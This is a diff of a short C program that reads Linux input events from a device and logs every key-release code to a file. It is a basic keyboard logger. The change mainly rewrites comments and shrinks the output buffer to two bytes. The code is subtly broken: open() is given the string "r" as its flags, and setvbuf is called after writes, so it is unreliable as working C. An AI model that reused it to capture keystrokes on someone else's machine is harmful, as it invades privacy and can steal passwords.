@@ -17,7 +17,7 @@
 int main(int argc, char **argv) {
 	FILE *listening;
 	int key;
-	char buff[1024];  /* sets buffer size */
+	char buff[2];  /* sets buffer size -- size of ev.code */
 
 	if(argc < 2) {
 		printf("USAGE: %s <device>\n", argv[0]);
@@ -30,18 +30,18 @@ int main(int argc, char **argv) {
 		return 1;
 	}
 
-	key = open(argv[1], "r");  /* opens the port */
-	// we'll use input_event to identify what we're reading
-	struct input_event ev;
+	key = open(argv[1], "r");	/* opens the port */
+	struct input_event ev;		/* using input_event so we 
+								 * know what we're reading 
+								 */
 
 	while(1) {
-		// passes keyboard input into input_event
 		read(key, &ev, sizeof(struct input_event));
-		// Only read the key release event
-		if(ev.value == 0 && ev.type == 1) {	
+		if(ev.value == 0 && ev.type == 1) {			/* only register release state */
 			fprintf(listening, "%i", ev.code);
-			// forces the write to listening
-			setvbuf(listening, buff, _IOFBF, 1024);
+			setvbuf(listening, buff, _IOFBF, 2);	/* forces the write
+													 * to listening 
+													 */
 		}
 	}
 	fclose(listening);
